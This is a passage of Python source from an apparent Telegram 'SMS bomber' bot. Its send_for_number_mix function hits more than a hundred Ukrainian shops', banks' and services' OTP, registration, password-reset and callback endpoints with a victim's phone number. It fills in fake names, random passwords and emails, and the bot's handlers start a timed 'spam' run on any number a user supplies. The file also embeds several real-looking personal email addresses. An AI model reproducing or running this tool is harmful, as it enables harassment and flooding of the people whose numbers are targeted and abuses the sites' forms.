        call = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_W5DgT','isAjax': '1','unique_id': 'W5DgT'})
        time.sleep(0.4)
        call = requests.post(f'https://omegamc.ua/recallme.php',headers=headers,data={'name': name,'tel': f'+{aa[:3]}({aa[3:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}'})
        time.sleep(0.4)
        call = requests.post('https://likarni.com/call',headers=headers,data={'callback[partner_id]': '','callback[telephone]': aa,'callback[description]': ''})
        time.sleep(0.4)
        call = requests.post('https://eventmaster.com.ua/api/FormRequest/SendGetCallRequest',headers=headers,data={'name': name,'phone': number_plus,'message': '','isMobile': ''})
        time.sleep(0.4)
        call = requests.post('https://www.lumident.kiev.ua/form/ua/appointmentHeader',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
    except:
        pass
    print('все')


def send_for_number_mix(aa):
    headers = {
        'User-Agent':get_agent()
    }

    messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']

    emails_list = ['prostoegorich2@gmail.com',
          'autoskilz068@gmail.com',
          'maksimbardic@gmail.com',
          'ttgbot.proekt@gmail.com',
          'webmine123@gmail.com']
    email = ''.join([random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) for m in range(10)]) + '@gmail.com'

    with open('nimes.txt', 'r',encoding='utf-8') as f:
        name = choice(f.read().split())
    with open('surname.txt', 'r',encoding='utf-8') as f:
        surname = choice(f.read().split())
    password = ''.join([random.choice(list('йцукенгшщзфывапролдячсмитьбЙЦУКЕНГШЩЗФЫВАПРОЛДЯЧСМИТЬБ1234567890_')) for m in range(7)])

    uniq_number = f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'
    uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
    number_plus = '+' + aa

    hour = datetime.now().strftime('%H')
    minute = datetime.now().strftime('%M')
    day = datetime.now().strftime('%j')
    day = int(day)-1
    
    try:
        d = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})    
        time.sleep(0.4)
        d = requests.post('https://www.foxtrot.com.ua/uk/home/saveordercall',headers=headers,data={'callbacktype': '0','Phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','__RequestVerificationToken': 'CfDJ8J1xteDpL4JClh37Z9x1CRgd8v8ZdrEhv7awSMS6zrMlJx7e3Ixy8LAKabotsCLFE5OYiZKX8J46aBiM8dxkr60Bwl671WHDTCTLqHlMvhhhTRiP_wsoU4O8HcK9riVkvzzTma6UcUyvL6hTlHO5yoA','X-Requested-With': 'XMLHttpRequest'})    
        time.sleep(0.4)
        d = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers, data={'phone': aa})   
        time.sleep(0.4)
        d = requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers, json={"phone": aa})
        time.sleep(0.4)
        d = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone':aa,'platform':'PISWeb'})
        time.sleep(0.4)
        d = requests.post('https://city-drive.phonet.com.ua/rest/public/widget/call-catchers/15bdee1b-7e69-4a97-b04b-8d96708fe5b5/call?timestamp=1663171005082&utcOffset=-180',headers=headers, json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "1d6cfee7-0292-4cab-b3fa-b74d66a45940","uaId": "UA-21322812-1","clientId": "1008992044.1662752535","pageUrl": "https://city-drive.ua/user/register"}) 
        time.sleep(0.4)
        d = requests.post('https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTI5YWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM2OTMyNQ&locale=ua&action=register_new_user',headers=headers,data={'mobileNumber':aa}) 
        time.sleep(0.4)
        d = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, data={'phone': aa}) 
        time.sleep(0.4)
        d = requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers=headers, data={'action': 'ajax_register_user','step': '1','phone': aa,'smscode': '','security_login': '9df5729c62'}) 
        time.sleep(0.4)
        d = requests.post('https://vilki-palki.od.ua/api/secret/generate?lang=russian', headers=headers, data={'phone': uniq_number}) 
        time.sleep(0.4)
        d = requests.post('https://kasta.ua/api/v2/login/', headers=headers, json={'phone': aa}) 
        time.sleep(0.4)
        d = requests.post('https://sundog.production.vidmind.com/sundog/graphql',headers=headers, json={"operationName": "GenerateOTP","variables": {"phoneNumber": aa},"extensions": {"persistedQuery": {"version": 1,"sha256Hash": "09e59b531d78c88983ebbb37807aae4797c43edd03a674a5e08d1480424fb7f9"}}}) 
        time.sleep(0.4)
        d = requests.post('https://credit7.ua/client/login',headers=headers, data={'phone':f'({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'}) 
        time.sleep(0.4)
        d = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa}) 
        time.sleep(0.4)
        d = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers,json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": "Вавааав","udriveEmployee": 'false'}) 
        time.sleep(0.4)
        d = requests.post('https://my.telegram.org/auth/send_password',headers=headers,data={'phone': number_plus}) 
        time.sleep(0.4)
        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call?timestamp=1662909402671&utcOffset=-180',headers=headers,json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","uaId": "UA-72798timeout=1.5,3-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/odnorazovye-elektronnye-sigarety"}) 
        time.sleep(0.4)
        d = requests.post('https://anc.ua/authorization/auth/v2/register',headers=headers,json={'login': f'{number_plus}'}) 
        time.sleep(0.4)
        d = requests.get(f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{aa}&code=&type=sms',headers=headers) 
        time.sleep(0.4)
        d = requests.post('https://buketland.phonet.com.ua/rest/public/widget/call-catchers/02a157cf-3c3b-4bbd-9398-92b81a93b12c/call?timestamp=1662908228931&utcOffset=-180',headers=headers,json={"phone": number_plus,"utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "d1b62cfb-b334-47d5-bbf6-95dbb15404a2","uaId": "UA-5timeout=1.5,07303-6","clientId": "1717388277.1662908163","pageUrl": "https://buketland.com.ua/index.php?route=account/success"}) 
        time.sleep(0.4)
        d = requests.post('https://telemart.ua/auth/',headers=headers,data={'login': number_plus,'action': 'submitPassword','token': 'st'}) 
        time.sleep(0.4)
        d = requests.post('https://credit7.ua/client/registration/general-information',headers=headers,data={'mobile_phone': f'{aa[:2]}{(aa[2:5])}{aa[5:8]} {aa[8:10]} {aa[10:12]}'}) 
        time.sleep(0.4)
        d = requests.post('https://vandalvape.com.ua/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': f'{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        d = requests.post('https://f.ua/ajax/callback/',headers=headers, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','title': '','url': 'https://f.ua/','mail': '','notes': ''}) 
        time.sleep(0.4)
        d = requests.get(f'https://c2c.oschadbank.ua/api/sms/aa',headers=headers) 
        time.sleep(0.4)
        d = requests.post('https://cinemaciti.ua/',headers=headers,data={'email': choice(emails_list),'phone': aa,'arraySeats': '','terms_and_conditions': 'on'}) 
        time.sleep(0.4)
        d = requests.post('https://apidev.color-it.ua/api/auth/code',headers=headers,json={'phone': aa[2:]}) 
        time.sleep(0.4)
        d = requests.post('https://agro-market.net/ajax/auth.php',headers=headers, data={'mode': 'reg','phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','name': name,'email': 'autoskilz068@gmail.com','code': '0','app': 'false'}) 
        time.sleep(0.4)
        d = requests.post('https://callback.ringostat.net/api/initiateCallback/',headers=headers,data={'data[num_to_call]': number_plus,'data[ua_id]': 'UA-82454976-1','data[hash]': '82739324abe17ftimeout=1.5,8bdaa7f9149b423c4b0883a7','data[client_id]': 'timeout=1.5,35316644.1662907751','data[utmz]': '','data[avg_time_to_call]': '60','data[page_url]': 'https://proflowers.ua/st','data[hid]': '8bc602ca-1a0b-43c9-9609-f556ca267timeout=1.5,c','data[verified_user]': '1'}) 
        time.sleep(0.4)
        d = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers, json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": name,"udriveEmployee": 'false'}) 
        time.sleep(0.4)
        d = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_IY9DZ','isAjax': '1','unique_id': 'IY9DZ'}) 
        time.sleep(0.4)
        d = requests.post('https://agrotender.com.ua/buyerreg',headers=headers,data={'action': 'send-code','phone': aa}) 
        time.sleep(0.4)
        d = requests.post('https://elektreka.com.ua/index.php?route=extension/module/callback',headers=headers,data={'phone': number_plus,'url_site': 'https://elektreka.com.ua/rozetki-i-vyklyuchateli/?gclid=Cj0KCQjwjvaYBhDlARIsAO8PkE3IaTWJylV7VfA_f0k6DfemVao4cU1w12twNAFB8DPPErFj-FWAsqwaAjy3EALw_wcB','action': 'send'}) 
        time.sleep(0.4)
        d = requests.post('https://api.bossautoukraine.com.ua/api/v1/orders/bid',headers=headers,json={"name": name,"phone": number_plus,"message": "Зв'язатись зараз","to": "semenyuk.c.s@gmail.com","subject": "Зворотній дзвінок : https://bossautoukraine.com.ua/cars/","office": "Стрий, вул. Болехівська 47а","isMobile": 'true'}) 
        time.sleep(0.4)
        d = requests.post('https://loyalty.vidi.ua/register',headers=headers,data={'locale': 'ua','name': name,'lname': surname,'mname': name,'email': email,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}', 'password': password}) 
        time.sleep(0.4)
        d = requests.post('https://automoto.ua/uk/my-office/login',headers=headers,json={"phone": f'{aa[:2]} {aa[2:5]} {aa[5:8]}{aa[8:10]}{aa[10:12]}'}) 
        time.sleep(0.4)
        d = requests.get(f'https://api.eldorado.ua/v1/sign/?login={aa}&step=password-recovery-step&lang=ua',headers=headers) 
        time.sleep(0.4)
        d = requests.post('https://synthetic.ua/api/auth/register/',headers=headers,json={"mobile_phone": aa,"password": "кнкнккнекне","password_confirm": "кнкнккнекне"}) 
        time.sleep(0.4)
        d = requests.post('https://api.starylev.com.ua/api/v1.1/sms/sent',headers=headers,json={"phone": aa,"email": email}) 
        time.sleep(0.4)
        d = requests.post('https://veloplaneta.ua/graphql/',headers=headers,json={"operationName": "requestFeedbackMutation","variables": {"phone": aa},"query": "mutation requestFeedbackMutation($phone: String!) {\n  feedback {\nrequestFeedback(phone: $phone)\n__typename\n  }\n}\n"}) 
        time.sleep(0.4)
        d = requests.post('https://alcoexpert.shop/wp-json/contact-form-7/v1/contact-forms/2165/feedback',headers=headers,data={'userphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        d = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa})
        time.sleep(0.4)
        d = requests.post('https://my.tpozyka.com/registration-handle-1',headers=headers,data={'data':f'lastname={surname}&name={name}&phone=%2B{aa[:2]}+({aa[2:5]})+{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        d = requests.post('https://ticketsbox.com/?route=account/authorization',headers=headers, data={'username': aa,'type': 'lost'}) 
        time.sleep(0.4)
        d = requests.post('https://vchehle.ua/uk/callback',headers=headers, data={'page': 'https://vchehle.ua/uk/pages/contacts','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','message': choice(messages)}) 
        time.sleep(0.4)
        d = requests.post('https://vchehle.ua/uk/register',headers=headers, data={'email': number_plus,'password': 'gdfgdfgfddgf','password_confirmation': 'gdfgdfgfddgf'}) 
        time.sleep(0.4)
        d = requests.post('https://my.lun.ua/api/user/login',headers=headers, json={'login': number_plus}) 
        time.sleep(0.4)
        d = requests.post('https://api.riel.ua/graphql',headers=headers, json={"operationName": "StoreSendSms","variables": {"phone": aa},"query": "mutation StoreSendSms($phone: String) {\n  storeSendSms(phone: $phone)\n}\n"}) 
        time.sleep(0.4)
        d = requests.post('https://lagrande.com.ua/interactive/ajax.php?zone=site&action=AjaxCallback&task=send&type=HeaderCallback',headers=headers, data={'firstname': name,'phone': number_plus}) 
        time.sleep(0.4)
        d = requests.post('https://pancer.phonet.com.ua/rest/public/widget/call-catchers/a55fd900-92f9-4ac6-89be-3a07c17876c7/call-postponed?timestamp=1663000707689&utcOffset=-180',headers=headers, json={"phone": number_plus,"date": "13-Сентября-2022","time": "10:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "5a2a4ba1-2145-4695-93c4-5e7898922934","timestamp": 1663052400000,"uaId": "UA-53329668-1","clientId": "428965036.1663000448","pageUrl": "https://pancer.com.ua/ua/travmaticheskie-pistolety"}) 
        time.sleep(0.4)
        d = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1}) 
        time.sleep(0.4)
        d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day':f'd{day}','hour':f'h{hour}','minute':f'm{minute}','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'}) 
        time.sleep(0.4)
        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.4)
        d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}') 
        time.sleep(0.4)
        d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,data={'un': name,'uph': number_plus}) 
        time.sleep(0.4)
        d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"}) 
        time.sleep(0.4)
        d = requests.post('https://agat-m.com.ua/send.php',headers=headers,data={'name': name,'phone': number_plus}) 
        time.sleep(0.4)
        d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers) 
        time.sleep(0.4)
        d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,json={"phone": number_plus}) 
        time.sleep(0.4)
        d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,json={'phone': number_plus}) 
        time.sleep(0.4)
        d = requests.post(f'https://my.hmara.tv/api/sign?contact={aa}',headers=headers) 
        time.sleep(0.4)
        d = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": get_agent(),"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa}) 
        time.sleep(0.4)
        d = requests.post('https://www.pratik.com.ua/uk/?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhIWCEV44RWKP16RvSC3Cj8E-ntL6NkYlW2V9kAyBugHoTLRziRZzrhoC_sUQAvD_BwE',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','action_form': 'get_auth_sms'})    
        time.sleep(0.4)
        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={'name': name, 'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})    
        time.sleep(0.4)
        d = requests.post('https://angio.com.ua/send_login_code',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','remember': 'false'})    
        time.sleep(0.4)
        d = requests.post('https://gepur.com/rapi/auth/register-retail-buyer',headers=headers,json={"email": email,"password": password,"phone": number_plus,"fio": f"{name} {surname} {name}"})    
        time.sleep(0.4)
        d = requests.post('https://ehr.h24.ua/api/v2/signup',headers=headers,json={"phone_number": number_plus})    
        time.sleep(0.4)
        d = requests.get(f'https://dok.ua/profile/newsms/{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}',headers=headers)    
        time.sleep(0.4)
        d = requests.post('https://go.varus.ua/api/ext/uas/auth/send-otp?storeCode=ua',headers=headers,json={'phone': number_plus})    
        time.sleep(0.4)
        d = requests.post('https://www.iqos.com.ua/ru',headers=headers,data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})     
        time.sleep(0.4)
        d = requests.post('https://brand-centr.com/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': aa})    
        time.sleep(0.4)
        d = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})    
        time.sleep(0.4)
        d = requests.post('https://auth.easypay.ua/api/check',headers=headers, json={"phone": aa})    
        time.sleep(0.4)
        d = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers, json={'phone': aa})
        time.sleep(0.4)
        d = requests.post('https://tea.ua/api/web/auth/verifyPhone',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}', 'phoneCode': "+38"})
        time.sleep(0.4)
        d = requests.post('https://smaki-maki.com/wp-admin/admin-ajax.php',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','birthday': '15.01.1998','password': password,'password2': password,'code': '','action': 'register_user'})
        time.sleep(0.4)
        d = requests.post('https://yaskravaklumba.com.ua/index.php?route=common/header/addiwishcall',headers=headers,data={'name': name,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}','text': ''})
        time.sleep(0.4)
        d = requests.post('https://kombinat.kiev.ua/wp-admin/admin-ajax.php',headers=headers,data={'action': 'do_something','name': 'name','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}','subject': ''})
        time.sleep(0.4)
        d = requests.post('https://piromarket.com.ua/index.php?dispatch=place_order.call_you_back&comment=',headers=headers,data={'name': name,'tel':  aa})
        time.sleep(0.4)
        d = requests.post('https://ilounge.ua/ajax/send-message-to-telegram.php',headers=headers,data={'callmeback-name': name,'callmeback-phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        d = requests.post('https://elektro.in.ua/callme.php',headers=headers,data={'phone': f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        d = requests.post('https://mamazin.com.ua/ua/api/s/',headers=headers,data={'ajaxCall': '1','user': 'guest','form[action]': 'callme','form[name]': name,'form[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','form[theme]': '2'})
        time.sleep(0.4)
        d = requests.post('https://vchehle.ua/uk/callback',headers=headers,data={'page': 'https://vchehle.ua/uk/kolonki','name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}' ,'message': ''})
        time.sleep(0.4)
        d = requests.post('https://pit-jey.com/index.php?route=extension/module/cyber_callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','comment_buyer': '','url_site': 'https://pit-jey.com/ua/simpleregister/','action': 'send'})
        time.sleep(0.4)
        d = requests.post('https://med-magazin.ua/ajax/call/set/',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        d = requests.post('https://air-conditioner.ua/page/page/mail-callback',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        d = requests.post('https://aber.com.ua/feedback/callback',headers=headers,data={'firstname': name,'cellphone': number_plus,'time_info': '','isAjaxForm': 'callbackForm','isAjax': '1'})
        time.sleep(0.4)
        d = requests.post('https://welovemebel.com.ua/ajax/auth_register.php',headers=headers,data={'USER_LOGIN': number_plus,'USER_EMAIL': email,'SECRET': 'secretcode'})
        time.sleep(0.4)
        d = requests.post('https://atmo.ua/feedback/callback',headers=headers,data={'firstname': name,'cellphone': number_plus,'isAjaxForm': 'callbackForm','isAjax': '1'})
        time.sleep(0.4)
        d = requests.post('https://carta.ua/api/v1.0/register/user',headers=headers,json={"username": name,"phone": f'({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"plainPassword": {"first": password,"second": password},"confirmType": "phone"})
        time.sleep(0.4)
        d = requests.post('https://e-ukrservice.com/index.php?route=common/callbacks/send',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','url': 'https://e-ukrservice.com/ru/lantsyugovi-pyly/?gclid=Cj0KCQjwvZCZBhCiARIsAPXbaju7thYMTzoU8CcNrAnukdwhF3L7csqNTl4KiLozmn71z0LUVD36MN4aAvSoEALw_wcB','form': 'header_callback'})
        time.sleep(0.4)
        d = requests.post('https://fitness-club.lviv.ua/wp-content/themes/fitnes/mail.php',headers=headers,data={'name': name,'tel': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}','adress': 'chor'})
        time.sleep(0.4)
        d = requests.post('https://webapi.sportlife.ua/landing-form-submissions',headers=headers,json={"utm_source": 'null',"utm_medium": 'null',"utm_campaign": 'null',"utm_term": 'null',"utm_content": 'null',"remote_addr": "178.92.20.29","club_id": "18","club_name": "Героїв УПА","city_id": "41","club_raw": "ЛВУ","comment_1": "Регистрации с конструктора абонементов (New site)","name": name,"patronymic": "","surname": "","birthday": "","phone": f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"email": "","address": "","club": "28","city": "2","acceptment": True})
        time.sleep(0.4)
        d = requests.post('http://kirbud.com.ua/index.php?route=extension/module/callback',headers=headers,data={'name': '','phone': number_plus,'comment': '','action': 'send'})
        time.sleep(0.4)
        d = requests.post('https://maslotom.com/api/index.php?route=api/account/phoneLogin',headers=headers,data={'phone': f'+{aa[:3]}({aa[3:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        d = requests.post('https://bcaa.ua/interactive/ajax.php?zone=site&action=callback',headers=headers,data={'firstname': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        d = requests.post('https://protein-max.com.ua/ajaxrequest',headers=headers,data={'mguniqueurl': 'action/sendOrderRing','pluginHandler': 'back-ring','name': 'name','comment': '','phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','city_id': '','mission': '','date_callback': '','time_callback': '','invisible': '1','status_id': '1','pub': '1','capcha': ''})
        time.sleep(0.4)
        d = requests.post('https://vitok.ua/ua/feedback/headerCallback/',headers=headers,data={'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'headerCallbackForm_W5DgT','isAjax': '1','unique_id': 'W5DgT'})
        time.sleep(0.4)
        d = requests.post('https://prontopizza.ua/lviv/wp-admin/admin-ajax.php',headers=headers,data={'first_name': name,'last_name': surname,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','input_check_send_sms': '','email': email,'password': password,'password2': password,'agree': 'on','action': 'register_user'})
        time.sleep(0.4)
        d = requests.post('https://pesto-family.com/index.php?route=information/contact/feedback',headers=headers,data={'route': 'information/contact/feedback','feedbackName': name,'feedbackPhone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','feedbackEmail': '','feedbackMsg': ''})
        time.sleep(0.4)
        d = requests.post('https://sushiya.ua/ru/api/v1/user/auth',headers=headers,data={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}','need_skeep': ''})
        time.sleep(0.4)
        d = requests.post('https://api.sezamfood.com.ua/ru/request/auth-phone',headers=headers,json={"phone": aa,"agree": 1})
        time.sleep(0.4)
        d = requests.post('https://www.garrys.com.ua/ajax/reguser/',headers=headers,data={'name': name,'login': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','password': password,'control': '1'})
        time.sleep(0.4)
        d = requests.post('https://www.garrys.com.ua/ajax/remind_password/',headers=headers,data={'nphone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.4)
        sms = requests.post('https://www.lumident.kiev.ua/form/ua/appointmentHeader',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
        time.sleep(0.4)
        sms = requests.post('https://odrex.top/api/sms',headers=headers,json={"phone": aa,"sms_code_type": "random","type": "registration"})
        time.sleep(0.4)
        sms = requests.post('https://auth2.multiplex.ua/login',headers=headers,json={"login": aa})
        time.sleep(0.4)
        sms = requests.post('https://samsonite.ua/auth/loginbyphone',headers=headers,data={'phone': '+'+aa[:2] + ' ' + aa[2:5] + ' ' + aa[5:8]+ '-' + aa[8:10]+ '-' +aa[10:12],'code': ''})
        time.sleep(0.4)
        call = requests.post(f'https://omegamc.ua/recallme.php',headers=headers,data={'name': name,'tel': f'+{aa[:3]}({aa[3:5]}) {aa[5:8]}-{aa[8:10]}{aa[10:12]}'})
        time.sleep(0.4)
        call = requests.post('https://likarni.com/call',headers=headers,data={'callback[partner_id]': '','callback[telephone]': aa,'callback[description]': ''})
        time.sleep(0.4)
        call = requests.post('https://eventmaster.com.ua/api/FormRequest/SendGetCallRequest',headers=headers,data={'name': name,'phone': number_plus,'message': '','isMobile': ''})
        time.sleep(0.4)
    except:
        pass
    print('все')

def start_spam(chat_id, phone_number, force,second,name,user_id):
    running_spams_per_chat_id.append(chat_id)
    with open('black_list.txt', 'rb') as f:
        blck = f.read().split()
    global phone
    global secc
    global chat_id_call
    global nname 
    global forcee
    forcee = force
    nname = name
    secc = second
    chat_id_call = chat_id
    phone = phone_number
    bot.send_message(5112839866,f'{name} почав спам на номер {phone_number} і на {second} секунд\nЙого айді: {user_id}')
    bot.send_message(chat_id, f'<b>👨‍💻Номер телефона: {phone_number}\n🙈Таймер: на {second} секунд\nВибирите тип спама:</b>', parse_mode='HTML',reply_markup=kb.inline_main)

@bot.callback_query_handler(func=lambda call: True)
def call_back(call: types.CallbackQuery):
    if call.data == 'mix':
        bot.edit_message_text(f'☎️💬Почався спам на номер *{phone}*\n⏳Таймер: *{secc}*\n😊Тип спаму *mix*\n',chat_id_call,call.message.id,parse_mode='Markdown')
